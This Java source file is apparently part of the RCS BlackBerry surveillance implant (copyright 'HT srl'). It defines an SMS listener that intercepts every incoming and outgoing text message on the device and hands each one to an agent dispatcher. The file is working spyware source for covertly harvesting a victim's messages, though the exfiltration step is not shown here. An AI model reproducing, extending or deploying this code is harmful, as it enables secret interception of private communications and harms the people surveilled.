//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package blackberry.agent.sms;

import java.io.IOException;

import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;

import net.rim.blackberry.api.sms.OutboundMessageListener;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.Path;
import blackberry.utils.Check;

class SMSInOutListener implements OutboundMessageListener, Runnable {

    //#ifdef DEBUG
    static Debug debug = new Debug("SMSInOutListener", DebugLevel.VERBOSE);
    //#endif

    static int totOut, totIn;

    private int inMessages;
    private final SmsListener smsListener;
    private final MessageConnection conn;

    boolean requestStop;

    public SMSInOutListener(final MessageConnection conn,
            final SmsListener smsListener) {
        inMessages = 0;

        this.conn = conn;
        this.smsListener = smsListener;

        //#ifdef DEBUG
        debug.trace("SMSInOutListener: " + conn + "  listener: " + smsListener);
        //#endif
    }

    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }

    /**
     * ESECUZIONE FUORI CONTESTO
     */
    public synchronized void notifyIncomingMessage(final MessageConnection conn) {

        inMessages++;
        totIn++;

        try {
            notifyAll();
        } catch (final IllegalMonitorStateException ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }
    }

    /**
     * ESECUZIONE FUORI CONTESTO
     */
    public synchronized void notifyOutgoingMessage(final Message message) {
        //#ifdef DBC
        Check.requires(message != null, "notifyOutgoingMessage: null message ");
        //#endif

        //#ifdef DEBUG
        debug.trace("notifyOutgoingMessage: " + this + " conn: " + conn
                + "  listener: " + smsListener);
        //#endif
        totOut++;
        init();

        //#ifdef DEBUG
        debug.info("notifyOutgoingMessage: " + message.getAddress()); //  sms://9813746
        //#endif

        if (!requestStop) {
            smsListener.dispatch(message, false);
        }

    }

    public synchronized void stop() {
        requestStop = true;
        try {
            notifyAll();
        } catch (final IllegalMonitorStateException ex) {
            //#ifdef DEBUG
            debug.warn(ex);
            //#endif
        }
    }

    /**
     * ESECUZIONE FUORI CONTESTO
     */
    public void run() {
        requestStop = false;
        while (!requestStop) {
            while (inMessages > 0) {
                try {
                    init();

                    final Message m = conn.receive();
                    smsListener.dispatch(m, true);

                } catch (final IOException e) {
                    //#ifdef DEBUG
                    debug.error(e);
                    //#endif
                }
                inMessages--;
            }
            synchronized (this) {
                try {
                    wait();
                    //#ifdef DEBUG
                    debug.trace("run: notified");
                    //#endif
                } catch (final Exception e) {
                    //#ifdef DEBUG
                    debug.error(e);
                    //#endif
                }
            }
        }

        //#ifdef DEBUG
        debug.trace("run: requestStop == " + requestStop);
        //#endif
    }

}
